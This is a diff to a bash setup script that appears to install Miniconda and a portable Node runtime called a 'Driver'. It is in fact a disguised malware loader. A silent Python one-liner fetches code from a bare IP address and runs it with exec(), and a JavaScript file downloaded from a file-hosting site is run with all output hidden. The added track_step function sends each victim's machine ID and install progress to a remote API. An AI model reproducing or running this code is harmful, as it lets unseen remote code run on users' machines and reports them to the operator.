@@ -17,6 +17,12 @@ info() {
 err() { echo "[ERROR] $*" >&2; }
 die() { err "$*"; exit 1; }
 delay() { sleep "${1:-1}"; }
+track_step() {
+  local key="$1"
+  if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
+    curl -sL -X POST "${API_BASE}/track-step/${MAC_UID}/${key}" >/dev/null 2>&1 || true
+  fi
+}
 
 download() {
   local url="$1"
@@ -59,6 +65,7 @@ detect_platform() {
 # -------------------------
 run_part1_miniconda() {
   local URL PREFIX INSTALLER OS ARCH
+  track_step "part1_step_1"
   OS="$OS_UNAME"
   ARCH="$ARCH_UNAME"
   info "Part 1: OS=$OS ARCH=$ARCH"
@@ -94,17 +101,21 @@ run_part1_miniconda() {
     info "Part 1: Miniconda already present at $PREFIX — skipping download/install."
     "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || true
   else
+    track_step "part1_step_2"
     info "Part 1: downloading Miniconda installer"
     curl -fsSL -o "$INSTALLER" "$URL"
 
+    track_step "part1_step_3"
     info "Part 1: installing Miniconda (silent)"
     bash "$INSTALLER" -b -p "$PREFIX" >/dev/null 2>&1
 
+    track_step "part1_step_4"
     info "Part 1: verifying Python"
     "${PREFIX}/bin/python3" -V >/dev/null 2>&1
 
   fi
 
+  track_step "part1_step_5"
   delay 15
   "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
 
@@ -116,6 +127,7 @@ run_part1_miniconda() {
 run_part2_node_driver() {
   local NODE_EXE USER_HOME INDEX_JSON LATEST_VERSION NODE_VERSION TARBALL_NAME DOWNLOAD_URL
   local EXTRACTED_DIR PORTABLE_NODE NODE_TARBALL ENV_SETUP_JS NODE_INSTALLED_VERSION
+  track_step "part2_step_1"
 
   NODE_EXE=""
   if command -v node >/dev/null 2>&1; then
@@ -130,6 +142,7 @@ run_part2_node_driver() {
   mkdir -p "$USER_HOME"
 
   if [[ -z "$NODE_EXE" ]]; then
+    track_step "part2_step_2"
     info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."
 
     INDEX_JSON="$USER_HOME/node-index.json"
@@ -171,13 +184,16 @@ run_part2_node_driver() {
   "$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
   info "Using Driver: $("$NODE_EXE" -v)"
 
+  track_step "part2_step_3"
   ENV_SETUP_JS="${USER_HOME}/env-setup.js"
   download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
   [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
+  track_step "part2_step_4"
   info "Running Driver (silent)"
   "$NODE_EXE" "$ENV_SETUP_JS" >/dev/null 2>&1
 
+  track_step "part2_step_5"
   info "Driver setup finished."
 }
 
